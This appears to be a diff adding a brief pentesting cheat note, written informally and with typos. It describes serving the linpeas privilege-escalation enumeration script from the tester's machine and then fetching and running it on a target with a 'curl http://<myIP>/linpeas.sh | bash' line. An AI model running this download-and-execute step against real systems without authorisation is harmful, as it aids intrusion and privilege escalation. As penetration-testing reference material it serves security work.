@@ -1,0 +1,4 @@
+You should have a copy of it at your desktop everytime you pentesting anything, cause is usefull.
+
+1) open a python webserver --> python3 -m http.server 80  (at the directory which linkpeas is downloaded)
+2) (at targert, mainly at /home/user)  curl http://<myIP>/linpeas.sh | bash
